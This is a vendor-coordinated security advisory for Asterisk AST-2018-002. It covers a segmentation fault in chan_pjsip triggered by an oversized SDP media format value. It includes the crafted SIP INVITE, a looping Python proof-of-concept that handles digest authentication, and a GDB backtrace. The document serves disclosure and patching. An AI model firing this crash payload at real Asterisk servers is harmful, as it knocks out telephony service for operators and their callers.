# Segmentation fault occurs in Asterisk with an invalid SDP media format description

- Authors:
    - Alfred Farrugia <alfred@enablesecurity.com>
    - Sandro Gauci <sandro@enablesecurity.com>
- Latest vulnerable version: Asterisk 15.2.0 running `chan_pjsip`
- References: AST-2018-002
- Enable Security Advisory: <https://github.com/EnableSecurity/advisories/tree/master/ES2018-03-asterisk-pjsip-sdp-invalid-media-format-description-segfault>
- Vendor Advisory: <http://downloads.asterisk.org/pub/security/AST-2018-002.html>
- Tested vulnerable versions: 13.10.0, 15.1.3, 15.1.4, 15.1.5, 15.2.0
- Timeline:
    - Report date: 2018-01-15
    - Vendor patch made available to us: 2018-02-05
    - Vendor advisory published: 2018-02-21
    - Enable Security advisory: 2018-02-22

## Description

A specially crafted SDP message body with an invalid media format description causes a segmentation fault in asterisk using `chan_pjsip`.

## Impact

Abuse of this vulnerability leads to denial of service in Asterisk when `chan_pjsip` is in use.

## How to reproduce the issue

The following SIP message was used to reproduce the issue:

```
INVITE sip:5678@127.0.0.1:5060 SIP/2.0
To: <sip:5678@127.0.0.1:5060>
From: Test <sip:5678@127.0.0.1:5060>
Call-ID: 5493d4c9-8248-4c26-a63c-ee74bcf3e1e8
CSeq: 2 INVITE
Via: SIP/2.0/UDP 172.17.0.1:10394;branch=z9hG4bK5493d4c9-8248-4c26-a63c-ee74bcf3e1e8
Contact: <sip:5678@172.17.0.1>
Content-Type: application/sdp
Content-Length: 115

v=0
o=- 1061502179 1061502179 IN IP4 172.17.0.1
s=Asterisk
c=IN IP4 172.17.0.2
m=audio 17002 RTP/AVP 4294967296
```


The problematic SDP section is:

```
m=audio 17000 RTP/AVP 4294967296
```


Notes: 

- authentication may be required 
- the destination SIP address should match a valid extension in the dialplan

To facilitate this process we wrote the following python program to reproduce this issue:

```python
import socket
import re
import md5
import uuid

SERVER_IP = "127.0.0.1"
SERVER_PORT = 5060
UDP_IP = "0.0.0.0"
UDP_PORT = 13940
USERNAME = "5678"
PASSWORD = "5678"
INVITE_USERNAME = "5678"

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind((UDP_IP, UDP_PORT))

while True:
    callid = str(uuid.uuid4())

    fmt = 4294967296

    sdpbody = "v=0\r\n" \
        "o=- 1061502179 1061502179 IN IP4 172.17.0.1\r\n" \
        "s=Asterisk\r\n" \
        "c=IN IP4 172.17.0.2\r\n" \
        "m=audio 17002 RTP/AVP %s" % fmt

    msg="INVITE sip:%s@%s:%i SIP/2.0\r\n" \
        "To: <sip:%s@%s:%i>\r\n" \
        "From: Test <sip:%s@%s:%s>\r\n" \
        "Call-ID: %s\r\n" \
        "CSeq: 2 INVITE\r\n" \
        "Via: SIP/2.0/UDP 172.17.0.1:10394;branch=z9hG4bK%s\r\n" \
        "Contact: <sip:%s@172.17.0.1>\r\n" \
        "Content-Type: application/sdp\r\n" \
        "{{AUTH}}" \
        "Content-Length: %i\r\n" \
        "\r\n" % (
            INVITE_USERNAME, SERVER_IP, SERVER_PORT,
            INVITE_USERNAME, SERVER_IP, SERVER_PORT,
            USERNAME, SERVER_IP, SERVER_PORT,
            callid, callid,
            USERNAME, len(sdpbody)
            ) + \
        sdpbody

    sock.sendto(msg.replace("{{AUTH}}", ""), (SERVER_IP, SERVER_PORT))

    data, addr = sock.recvfrom(10240)

    if data.startswith("SIP/2.0 401"):
        for line in data.split('\r\n'):
            if line.startswith("WWW-Authenticate"):
                content = line.split(':', 2)[1].strip()
                realm = re.search("realm=\"([a-z]+)\"", content).group(1)
                nonce = re.search("nonce=\"([a-z0-9\/]+)\"", content).group(1)
                ha1 = md5.new(USERNAME + ":" + realm + ":" + PASSWORD).hexdigest()
                uri = "sip:%s:%i" % (SERVER_IP, SERVER_PORT)
                ha2 = md5.new("INVITE:" + uri).hexdigest()
                r = md5.new(ha1 + ":" + nonce + ":" + ha2).hexdigest()

                auth = "Authorization: Digest username=\"%s\"," % (USERNAME) + \
                    "realm=\"%s\"," % (realm) + \
                    "nonce=\"%s\"," % (nonce) + \
                    "uri=\"%s\"," % (uri) + \
                    "response=\"%s\"," % (r) + \
                    "algorithm=md5\r\n"

    sock.sendto(msg.replace("{{AUTH}}", auth), (SERVER_IP, SERVER_PORT))
```

The loop is required since a crash might not occur immediately.

This security issue was discovered through the use of simple fuzzing with [Radamsa](https://github.com/aoh/radamsa) and our internal toolset.

### GDB backtrace result

```
gdb --args /opt/asterisk/sbin/asterisk -fcvvv

[Jan  2 16:07:36] DEBUG[45]: res_pjsip_session.c:743 handle_negotiated_sdp_session_media: Applied negotiated SDP media stream 'audio' using audio SDP handler
[Jan  2 16:07:36] ERROR[45]: pjproject:0 <?>: 	              except.c .!!!FATAL: unhandled exception PJLIB/No memory!


Thread 26 "asterisk" received signal SIGSEGV, Segmentation fault.
[Switching to Thread 0x7ffff0297700 (LWP 45)]
__longjmp_chk (env=env@entry=0x0, val=val@entry=1) at ../setjmp/longjmp.c:32
32	../setjmp/longjmp.c: No such file or directory.
(gdb) bt
#0  __longjmp_chk (env=env@entry=0x0, val=val@entry=1) at ../setjmp/longjmp.c:32
#1  0x00007ffff78ed4ae in pj_throw_exception_ (exception_id=1) at ../src/pj/except.c:54
#2  0x00007ffff7868070 in pool_callback (pool=<optimized out>, size=<optimized out>) at ../src/pjsip/sip_endpoint.c:143
#3  0x00007ffff78f1a93 in pj_pool_create_block (size=1407375809856000, pool=0x7fff8c002c90) at ../src/pj/pool.c:63
#4  pj_pool_allocate_find (pool=0x7fff8c002c90, size=1407375809852724) at ../src/pj/pool.c:138
#5  0x00007ffff78fbb75 in pj_strdup (pool=pool@entry=0x7fff8c002c90, dst=dst@entry=0x7fff8c027638, src=src@entry=0x7fff8c025638) at ../include/pj/string_i.h:41
#6  0x00007ffff78b287e in pjmedia_sdp_media_clone (pool=pool@entry=0x7fff8c002c90, rhs=0x7fff8c025608) at ../src/pjmedia/sdp.c:691
#7  0x00007ffff78b4069 in pjmedia_sdp_session_clone (pool=pool@entry=0x7fff8c002c90, rhs=0x7fff8c01cdb8) at ../src/pjmedia/sdp.c:1422
#8  0x00007ffff7847f31 in create_sdp_body (c_sdp=<optimized out>, pool=0x7fff8c002c90) at ../src/pjsip-ua/sip_inv.c:1722
#9  process_answer (inv=inv@entry=0x7fff8c009f28, st_code=st_code@entry=200, local_sdp=local_sdp@entry=0x0, tdata=0x7fff8c002d38, tdata=0x7fff8c002d38) at ../src/pjsip-ua/sip_inv.c:2257
#10 0x00007ffff7848681 in pjsip_inv_answer (inv=0x7fff8c009f28, st_code=st_code@entry=200, st_text=st_text@entry=0x0, local_sdp=local_sdp@entry=0x0, p_tdata=p_tdata@entry=0x7ffff0296d10) at ../src/pjsip-ua/sip_inv.c:2393
#11 0x00007fff6b0f8f77 in answer (data=0x7fff8c00b298) at chan_pjsip.c:660
#12 0x00007ffff17cb180 in sync_task (data=0x7ffff290c510) at res_pjsip.c:4270
#13 0x00000000005fb3be in ast_taskprocessor_execute (tps=tps@entry=0x1dd6298) at taskprocessor.c:963
#14 0x0000000000602610 in execute_tasks (data=0x1dd6298) at threadpool.c:1322
#15 0x00000000005fb3be in ast_taskprocessor_execute (tps=0x1a401b8) at taskprocessor.c:963
#16 0x0000000000602af0 in threadpool_execute (pool=0x1ae0e88) at threadpool.c:351
#17 worker_active (worker=0x7fff94000948) at threadpool.c:1105
#18 worker_start (arg=arg@entry=0x7fff94000948) at threadpool.c:1024
#19 0x000000000060d4bd in dummy_start (data=<optimized out>) at utils.c:1257
#20 0x00007ffff5e3d6ba in start_thread (arg=0x7ffff0297700) at pthread_create.c:333
#21 0x00007ffff54263dd in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:109
(gdb) 
```

## Solutions and recommendations

Apply the patch issued by Asterisk at <http://www.asterisk.org/security> or upgrade to the latest release.

## About Enable Security

[Enable Security](https://www.enablesecurity.com) provides Information Security services, including Penetration Testing, Research and Development, to help protect client networks and applications against online attackers.

## Disclaimer

The information in the advisory is believed to be accurate at the time of publishing based on currently available information. Use of the information constitutes acceptance for use in an AS IS condition. There are no warranties with regard to this information. Neither the author nor the publisher accepts any liability for any direct, indirect, or consequential loss or damage arising from use of, or reliance on, this information.
